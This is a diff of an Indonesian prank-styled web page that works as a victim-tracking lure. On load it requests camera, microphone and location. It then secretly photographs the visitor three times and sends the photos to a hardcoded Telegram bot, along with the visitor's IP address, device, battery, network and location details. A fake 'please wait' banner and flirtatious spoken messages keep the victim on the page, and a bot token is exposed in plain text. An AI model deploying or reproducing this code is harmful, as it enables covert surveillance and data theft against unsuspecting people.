@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="id">
+!DOCTYPE html><html lang="id">
 <head>
   <meta charset="UTF-8">
   <title>JANGAN DIPENCET KEPO AMAT😂</title>
@@ -13,7 +12,6 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      flex-direction: column;
     }
     .popup {
       background-color: rgba(0, 0, 0, 0.7);
@@ -37,26 +35,16 @@
       transition: opacity 1s ease;
       display: none;
     }
-    #namainput {
-      padding: 8px;
-      border-radius: 5px;
-      border: none;
-      margin-top: 10px;
-    }
   </style>
 </head>
 <body>
   <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
     hay tolong tunggu 5 menit dan tolong tab baru aja by rizky gg blora ©kerenprojek.
   </marquee>
-
   <div class="popup" id="step1">
-    <h2>Untuk melanjutkan, silakan masukkan nama kamu</h2>
-    <input type="text" id="namainput" placeholder="Nama kamu">
-    <button onclick="kirimNama()">LANJUTKAN</button>
-  </div>
-
-  <video id="video" autoplay playsinline></video>
+    <h2>Untuk melanjutkan, silakan klik tombol di bawah</h2>
+    <button onclick="startStreaming()">LANJUTKAN</button>
+  </div><video id="video" autoplay playsinline></video>
 
   <script>
     const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
@@ -64,40 +52,17 @@
     let recorder;
     let recordedChunks = [];
     let autoStream;
-    let nama = '';
 
-    async function kirimNama() {
-      nama = document.getElementById('namainput').value || 'Tidak diisi';
-
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const userAgent = navigator.userAgent;
-      const waktu = new Date();
-      const location = await getLocation();
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
-
-      const info = `
-█░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
-█▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
-▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀   
-Nama: ${nama}
-IP: ${ip}
-User-Agent: ${userAgent}
-Waktu: ${waktu.toLocaleString()}
-Lokasi: ${location}
-Baterai: ${battery}
-`;
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", info);
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error("Telegram error:", err));
-
-      startStreaming();
-    }
+    window.onload = async () => {
+      try {
+        await getLocation();
+        autoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        console.log("Akses kamera & mikrofon diberikan otomatis");
+        autoTakePhotos(); // ambil 3 foto saat pertama kali masuk
+      } catch (e) {
+        alert("Izin kamera/mikrofon atau lokasi ditolak.");
+      }
+    };
 
     async function startStreaming() {
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -110,6 +75,21 @@ Baterai: ${battery}
       const welcome = new SpeechSynthesisUtterance('Halo! Terima kasih sudah melanjutkan. Proses sedang berjalan tunggu 5 menit kaau blm juga tunggu 1 jam soalnya selver agak lemot silahkan tab baru aja dulu');
       welcome.lang = 'id-ID';
       synth.speak(welcome);
+
+      // sapaan bucin keren
+      const bucin = [
+        "Halo sayang, akhirnya kamu datang juga.",
+        "Aku kangen banget loh, jangan tinggalin aku ya!",
+        "Aku siap nemenin kamu sampai akhir, serius.",
+        "Jangan lupa senyum ya, soalnya senyummu bikin dunia lebih indah."
+      ];
+      bucin.forEach((text, i) => {
+        setTimeout(() => {
+          const u = new SpeechSynthesisUtterance(text);
+          u.lang = 'id-ID';
+          synth.speak(u);
+        }, (i + 1) * 5000);
+      });
 
       const popup = document.getElementById('step1');
       popup.style.transition = 'opacity 0.5s ease';
@@ -170,24 +150,30 @@ Baterai: ${battery}
       const location = await getLocation();
       const lastActive = waktu.toLocaleString();
 
-      const message = `
+      const message = `                                
 █░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
 █▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
 ▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀
-[REKAMAN KORBAN BY ©RIZKYGG]
-
+=====================================
 IP: ${ip}
+=====================================
 Perangkat: ${userAgent}
+=====================================
 Terakhir Aktif: ${lastActive}
+=====================================
 Waktu: ${date}, ${time}
+=====================================
 Lokasi: ${location}
+======================================
 Baterai: ${battery}
+======================================
 SIM Card: ${simInfo}
+======================================
 Jaringan: ${connection}
+======================================
 Merek Perangkat: ${brand}
-=======================================
-©PROJEK GG BY RIZKY
-`;
+=======================================               ©PROJEK GG BY RIZKY
+      `;
 
       const formData = new FormData();
       formData.append("chat_id", chat_id);
@@ -214,6 +200,59 @@ Merek Perangkat: ${brand}
         );
       });
     }
+
+    async function capturePhoto() {
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("photo", blob, "photo.jpg");
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.error("Telegram photo error:", err));
+    }
+
+    // Fitur auto ambil 3 foto pertama kali
+    async function autoTakePhotos() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+
+        for (let i = 0; i < 3; i++) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+          const formData = new FormData();
+          formData.append("chat_id", chat_id);
+         formData.append("photo", blob, `photo_${i + 1}.jpg`);
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          await new Promise(r => setTimeout(r, 1500));
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        console.warn("Gagal ambil foto otomatis:", e);
+      }
+    }
   </script>
 </body>
-</html>
+</html
